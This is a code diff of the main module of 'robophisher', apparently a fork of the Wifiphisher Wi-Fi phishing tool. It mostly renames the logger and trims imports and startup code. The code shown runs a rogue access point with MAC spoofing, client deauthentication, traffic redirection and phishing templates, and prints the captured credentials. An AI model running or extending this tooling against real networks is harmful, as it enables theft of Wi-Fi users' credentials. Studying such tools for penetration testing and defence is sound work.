@@ -9,18 +9,11 @@ import logging.config
 import time
 import sys
 import argparse
-import fcntl
-import curses
-import socket
-import struct
 import signal
 from threading import Thread
 import multiprocessing
-from subprocess import Popen, PIPE, check_output
-from shutil import copyfile
-import scapy.arch.linux as linux
+from subprocess import Popen
 from robophisher.common.constants import *
-import robophisher
 import robophisher.common.recon as recon
 import robophisher.arguments as arguments
 import robophisher.common.phishinghttp as phishinghttp
@@ -32,11 +25,7 @@ import robophisher.common.opmode as opmode
 import robophisher.helper as helper
 import robophisher.deauth as deauth
 
-logger = logging.getLogger(__name__)
-
-# Fixes UnicodeDecodeError for ESSIDs
-reload(sys)
-sys.setdefaultencoding('utf8')
+LOGGER = logging.getLogger(__name__)
 
 
 def parse_args():
@@ -123,16 +112,16 @@ def setup_logging(args):
     """
     Setup the logging configurations
     """
-    root_logger = logging.getLogger()
+    root_LOGGER = logging.getLogger()
     # logging setup
     if args.logging:
         logging.config.dictConfig(LOGGING_CONFIG)
         should_roll_over = False
-        # use root logger to rotate the log file
+        # use root LOGGER to rotate the log file
         if os.path.getsize(LOG_FILEPATH) > 0:
             should_roll_over = os.path.isfile(LOG_FILEPATH)
-        should_roll_over and root_logger.handlers[0].doRollover()
-        logger.info("Starting Wifiphisher")
+        should_roll_over and root_LOGGER.handlers[0].doRollover()
+        LOGGER.info("Starting Wifiphisher")
 
 
 def kill_interfering_procs():
@@ -267,7 +256,7 @@ class WifiphisherEngine:
     def stop(self):
         print("Captured credentials:")
         for cred in phishinghttp.creds:
-            logger.info("Creds: %s", cred)
+            LOGGER.info("Creds: %s", cred)
             print(cred)
 
         # move the access_points.on_exit before the exit for
@@ -280,7 +269,7 @@ class WifiphisherEngine:
             message = ("Failed to reset the routing rules:\n{}".format(
                 clear_rules_result.error_message))
             print(message)
-            logger.error(message)
+            LOGGER.error(message)
 
         if os.path.isfile('/tmp/robophisher-webserver.tmp'):
             os.remove('/tmp/robophisher-webserver.tmp')
@@ -304,7 +293,7 @@ class WifiphisherEngine:
 
         # Are you root?
         if os.geteuid():
-            logger.error("Non root user detected")
+            LOGGER.error("Non root user detected")
             sys.exit("Please run as root")
 
         self.network_manager.start()
@@ -322,7 +311,7 @@ class WifiphisherEngine:
                     internet_interface = args.internetinterface
                     if interfaces.is_wireless_interface(internet_interface):
                         self.network_manager.unblock_interface(internet_interface)
-                logger.info("Selecting %s interface for accessing internet",
+                LOGGER.info("Selecting %s interface for accessing internet",
                             args.internetinterface)
             if self.opmode.advanced_enabled():
                 if args.jamminginterface and args.apinterface:
@@ -334,7 +323,7 @@ class WifiphisherEngine:
                 else:
                     mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                 # display selected interfaces to the user
-                logger.info("Selecting {} for deauthentication and {} for rouge access point"
+                LOGGER.info("Selecting {} for deauthentication and {} for rouge access point"
                             .format(mon_iface, ap_iface))
                 print("Selecting {} for deauthentication and {} for rouge access point".format(
                     mon_iface, ap_iface))
@@ -366,13 +355,13 @@ class WifiphisherEngine:
 
                 print(
                     "Selecting {} interface for creating the rogue Access Point".format(ap_iface))
-                logger.info("Selecting {} interface for rouge access point".format(ap_iface))
+                LOGGER.info("Selecting {} interface for rouge access point".format(ap_iface))
                 # randomize the mac addresses
                 if not args.no_mac_randomization:
                     self.network_manager.set_interface_mac_random(ap_iface)
 
             # make sure interfaces are not blocked
-            logger.info("Unblocking interfaces")
+            LOGGER.info("Unblocking interfaces")
             self.network_manager.unblock_interface(ap_iface)
             self.network_manager.unblock_interface(mon_iface)
             # set monitor mode only when --essid is not given
@@ -380,7 +369,7 @@ class WifiphisherEngine:
                 self.network_manager.set_interface_mode(mon_iface, "monitor")
         except (interfaces.InvalidInterfaceError, interfaces.InterfaceCantBeFoundError,
                 interfaces.InterfaceManagedByNetworkManagerError) as err:
-            logger.exception("The following error has occurred:")
+            LOGGER.exception("The following error has occurred:")
             print(err)
 
             time.sleep(1)
@@ -388,16 +377,16 @@ class WifiphisherEngine:
 
         if not args.internetinterface:
             kill_interfering_procs()
-            logger.info("Killing all interfering processes")
+            LOGGER.info("Killing all interfering processes")
 
         rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)
         if not args.no_mac_randomization:
-            logger.info("Changing {} MAC address to {}".format(ap_iface, rogue_ap_mac))
+            LOGGER.info("Changing {} MAC address to {}".format(ap_iface, rogue_ap_mac))
             print("Changing {} MAC addr (BSSID) to {}".format(ap_iface, rogue_ap_mac))
 
             if self.opmode.advanced_enabled():
                 mon_mac = self.network_manager.get_interface_mac(mon_iface)
-                logger.info("Changing {} MAC address to {}".format(mon_iface, mon_mac))
+                LOGGER.info("Changing {} MAC address to {}".format(mon_iface, mon_mac))
                 print("Changing {} MAC addr to {}".format(mon_iface, mon_mac))
 
         redirect_localhost_result = firewall.redirect_to_localhost()
@@ -405,7 +394,7 @@ class WifiphisherEngine:
             message = ("Failed to redirect all requests to local host:\n{}".format(
                 redirect_localhost_result.error_message))
             print(message)
-            logger.error(message)
+            LOGGER.error(message)
             self.stop()
 
         print("Cleared leases, started DHCP, set up iptables")
@@ -417,7 +406,6 @@ class WifiphisherEngine:
             # We don't have target attacking MAC in frenzy mode
             # That is we deauth all the BSSIDs that being sniffed
             target_ap_mac = None
-            enctype = None
         else:
             # let user choose access point
             # start the monitor adapter
@@ -431,11 +419,10 @@ class WifiphisherEngine:
             channel = chosen_access_point.channel
             target_ap_mac = chosen_access_point.mac_address
             # Encrytpion could be anything but for now its always set to None
-            enctype = None
 
         # get the correct template
         template = get_chosen_template()
-        logger.info("Selecting {} template".format(template[0]))
+        LOGGER.info("Selecting {} template".format(template[0]))
         print("Selecting {} template".format(template[0]))
 
         # We want to set this now for hostapd. Maybe the interface was in "monitor"
@@ -456,20 +443,8 @@ class WifiphisherEngine:
             self.access_point.start_dhcp_dns()
         except BaseException:
             self.stop()
-        # If are on Advanced mode, start Extension Manager (EM)
         # We need to start EM before we boot the web server
-        if self.opmode.advanced_enabled():
-            shared_data = {
-                'is_freq_hop_allowed': self.opmode.freq_hopping_enabled(),
-                'target_ap_channel': channel or "",
-                'target_ap_essid': essid or "",
-                'target_ap_bssid': target_ap_mac or "",
-                'target_ap_encryption': enctype or "",
-                'rogue_ap_mac': rogue_ap_mac,
-                'args': args
-            }
-
-            self.network_manager.up_interface(mon_iface)
+        self.network_manager.up_interface(mon_iface)
         # With configured DHCP, we may now start the web server
         if not self.opmode.internet_sharing_enabled():
             # Start HTTP server in a background thread
@@ -504,12 +479,5 @@ class WifiphisherEngine:
 
 
 def run():
-    try:
-        print("Starting RoboPhisher {} at {}".format(robophisher.__version__,
-                                                     time.strftime("%Y-%m-%d %H:%M")))
-        engine = WifiphisherEngine()
-        engine.start()
-    except KeyboardInterrupt:
-        print("\n (^C) interrupted\n")
-    except EOFError:
-        print("\n (^D) interrupted\n")
+    print("Starting RoboPhisher ")
+    WifiphisherEngine().start()
